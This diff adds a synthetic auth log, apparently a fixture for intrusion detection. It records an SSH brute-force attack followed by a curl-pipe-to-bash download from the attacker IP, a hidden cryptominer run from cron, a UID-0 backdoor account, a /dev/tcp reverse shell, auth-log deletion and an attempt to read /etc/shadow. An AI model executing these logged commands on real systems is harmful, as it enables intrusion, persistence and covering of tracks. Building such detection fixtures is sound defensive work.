@@ -1,0 +1,38 @@
+Oct 18 03:01:02 web01 sshd[1201]: Accepted publickey for deploy from 192.168.1.20 port 51522 ssh2
+Oct 18 03:01:40 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 18 03:10:00 web01 sshd[2000]: Invalid user admin from 203.0.113.45 port 40000
+Oct 18 03:10:01 web01 sshd[2000]: Failed password for invalid user admin from 203.0.113.45 port 40000 ssh2
+Oct 18 03:10:05 web01 sshd[2001]: Failed password for root from 203.0.113.45 port 40001 ssh2
+Oct 18 03:10:08 web01 sshd[2002]: Invalid user test from 203.0.113.45 port 40002
+Oct 18 03:10:09 web01 sshd[2002]: Failed password for invalid user test from 203.0.113.45 port 40002 ssh2
+Oct 18 03:10:12 web01 sshd[2003]: Invalid user oracle from 203.0.113.45 port 40003
+Oct 18 03:10:13 web01 sshd[2003]: Failed password for invalid user oracle from 203.0.113.45 port 40003 ssh2
+Oct 18 03:11:17 web01 sshd[2004]: Failed password for ubuntu from 203.0.113.45 port 40004 ssh2
+Oct 18 03:11:20 web01 sshd[2005]: Invalid user postgres from 203.0.113.45 port 40005
+Oct 18 03:11:21 web01 sshd[2005]: Failed password for invalid user postgres from 203.0.113.45 port 40005 ssh2
+Oct 18 03:11:24 web01 sshd[2006]: Invalid user guest from 203.0.113.45 port 40006
+Oct 18 03:11:25 web01 sshd[2006]: Failed password for invalid user guest from 203.0.113.45 port 40006 ssh2
+Oct 18 03:11:28 web01 sshd[2007]: Invalid user pi from 203.0.113.45 port 40007
+Oct 18 03:11:29 web01 sshd[2007]: Failed password for invalid user pi from 203.0.113.45 port 40007 ssh2
+Oct 18 03:12:32 web01 sshd[2008]: Invalid user admin from 203.0.113.45 port 40008
+Oct 18 03:12:33 web01 sshd[2008]: Failed password for invalid user admin from 203.0.113.45 port 40008 ssh2
+Oct 18 03:12:37 web01 sshd[2009]: Failed password for root from 203.0.113.45 port 40009 ssh2
+Oct 18 03:12:40 web01 sshd[2010]: Invalid user test from 203.0.113.45 port 40010
+Oct 18 03:12:41 web01 sshd[2010]: Failed password for invalid user test from 203.0.113.45 port 40010 ssh2
+Oct 18 03:12:44 web01 sshd[2011]: Invalid user oracle from 203.0.113.45 port 40011
+Oct 18 03:12:45 web01 sshd[2011]: Failed password for invalid user oracle from 203.0.113.45 port 40011 ssh2
+Oct 18 03:13:49 web01 sshd[2012]: Failed password for ubuntu from 203.0.113.45 port 40012 ssh2
+Oct 18 03:13:52 web01 sshd[2013]: Invalid user postgres from 203.0.113.45 port 40013
+Oct 18 03:13:53 web01 sshd[2013]: Failed password for invalid user postgres from 203.0.113.45 port 40013 ssh2
+Oct 18 03:15:03 web01 sshd[2101]: Failed password for root from 198.51.100.7 port 52211 ssh2
+Oct 18 03:15:08 web01 sshd[2102]: Failed password for root from 198.51.100.7 port 52215 ssh2
+Oct 18 03:16:00 web01 sshd[2200]: Accepted password for ubuntu from 203.0.113.45 port 40111 ssh2
+Oct 18 03:16:00 web01 sshd[2200]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Oct 18 03:16:30 web01 sudo:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash -c curl -s http://203.0.113.45/x.sh | bash
+Oct 18 03:17:02 web01 sudo:   ubuntu : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x /tmp/.kworker
+Oct 18 03:17:10 web01 useradd[2310]: new user: name=sysadmin, UID=0, GID=0, home=/root, shell=/bin/bash
+Oct 18 03:17:30 web01 sudo:   ubuntu : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -l
+Oct 18 03:18:01 web01 CRON[2400]: (root) CMD (/tmp/.kworker -o stratum+tcp://pool.example.net:3333)
+Oct 18 03:18:40 web01 bash[2410]: ubuntu ran: bash -i >& /dev/tcp/203.0.113.45/4444 0>&1
+Oct 18 03:19:05 web01 sudo:   ubuntu : TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/bin/rm -rf /var/log/auth.log.1
+Oct 18 03:20:00 web01 sudo:  intern : user NOT in sudoers ; TTY=pts/2 ; PWD=/home/intern ; USER=root ; COMMAND=/bin/cat /etc/shadow
